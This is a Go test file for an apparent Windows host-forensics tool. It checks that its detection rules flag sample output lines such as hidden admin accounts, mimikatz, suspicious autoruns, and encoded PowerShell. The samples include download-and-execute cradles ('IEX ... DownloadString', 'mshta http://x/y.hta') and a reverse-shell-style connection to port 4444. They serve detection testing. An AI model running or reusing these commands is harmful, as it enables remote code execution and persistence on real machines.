package windows

import (
	"slices"
	"testing"

	"karma/internal/model"
)

// Rule hits for the new system-surface checks: each case picks one sample line shaped like real output.
func TestSystemCheckRules(t *testing.T) {
	cases := []struct {
		id   string
		text string
		want string
	}{
		{"software", `mimikatz 2.2.0 | 2.2.0 | 20250101`, "software-pentest"},
		{"software", `向日葵远程控制 | 15.2 | 20250101`, "software-remote"},
		{"env-vars", `    Path    REG_EXPAND_SZ    C:\Windows\system32;C:\Temp\bin\`, "env-path-suspicious"},
		{"env-vars", `    Path    REG_EXPAND_SZ    C:\Windows\system32;C:\Temp`, "env-path-suspicious"},
		{"shares", `backup -> D:\backup`, "custom-share"},
		{"rdp-config", `    fDenyTSConnections    REG_DWORD    0x0`, "rdp-enabled"},
		{"rdp-config", `    UserAuthentication    REG_DWORD    0x0`, "rdp-nla-off"},
		{"local-users", `hack$  enabled    2025-06-01 03:00:00  `, "local-user-hidden"},
		{"admin-group", `WIN-XXX\hack$  LocalGroup`, "admin-group-dollar"},
		{"processes", `4321  evil.exe  C:\Users\Public\Temp\evil.exe -enc AAAA`, "proc-temp-exe"},
		{"processes", `4322  powershell.exe  powershell.exe -nop -w hidden -enc AAAA`, "proc-payload"},
		{"connections", `  TCP    10.0.0.5:52134    1.2.3.4:4444    ESTABLISHED     4321`, "conn-evil-port"},
		{"win-hosts", `10.0.0.8    git.internal.corp`, "hosts-map"},
		{"run-keys", `    Backdoor    REG_SZ    C:\Users\Public\Files\evil.exe`, "autorun-temp"},
		{"run-keys", `    ScEval    REG_SZ    mshta http://x/y.hta`, "autorun-payload"},
		{"nt-services", `EvilSvc  Running  Auto  C:\Windows\Temp\svc.exe`, "svc-temp"},
		{"nt-services", `Legacy  Running  Auto  C:\Program Files (x86)\Some App\app.exe`, "svc-unquoted"},
		{"tasks", `\EvilUpdate  Ready  C:\Users\Public\Files\evil.exe -arg`, "task-userpath"},
		{"wmi-subscription", `CommandLineTemplate : C:\Windows\Temp\evil.exe`, "wmi-consumer"},
		{"scriptblock-log", `2025-06-01 03:00:00  IEX (New-Object Net.WebClient).DownloadString('http://x')`, "scriptblock-payload"},
		{"remote-control", `HKLM\SOFTWARE\TeamViewer`, "remote-ctrl-registry"},
		{"remote-control", `RustDesk  Running`, "remote-ctrl-service"},
	}
	for _, tc := range cases {
		check := checkByID(tc.id)
		if check == nil {
			t.Fatalf("check %s not in catalog", tc.id)
		}
		if !slices.Contains(hitIDs(tc.text, check), tc.want) {
			t.Errorf("%s should match %s: %q", tc.id, tc.want, tc.text)
		}
	}
	// A normal PATH (no temp/public directory) should not light up the hijack surface
	for _, clean := range []string{
		`    Path    REG_EXPAND_SZ    C:\Windows\system32;C:\Program Files\App\`,
		`    Path    REG_EXPAND_SZ    C:\Users\PublicFiles\bin`,
	} {
		if slices.Contains(hitIDs(clean, checkByID("env-vars")), "env-path-suspicious") {
			t.Errorf("normal PATH should not match: %q", clean)
		}
	}
}

// Rule on section titles: 1102 log clearing is a title hit, not a body-line hit.
func TestSecLogClearedTitleRule(t *testing.T) {
	check := checkByID("sec-log")
	text := "== 1102 Audit Log Cleared\n2025-06-01 03:00:00  已清除审计日志。\n"
	if !slices.Contains(hitIDs(text, check), "log-cleared") {
		t.Fatalf("1102 section title should match log-cleared: %q", text)
	}
}

// All new aspects should be in the catalog and their names recognizable by the selector.
func TestNewAspectsInCatalog(t *testing.T) {
	aspects := map[model.Aspect]int{}
	for _, check := range All {
		aspects[check.Aspect]++
	}
	for _, aspect := range []model.Aspect{model.AspectSystem, model.AspectIdentity, model.AspectProcess, model.AspectNetwork, model.AspectPersistence, model.AspectLog} {
		if aspects[aspect] == 0 {
			t.Errorf("aspect %s has no checks", aspect)
		}
	}
}
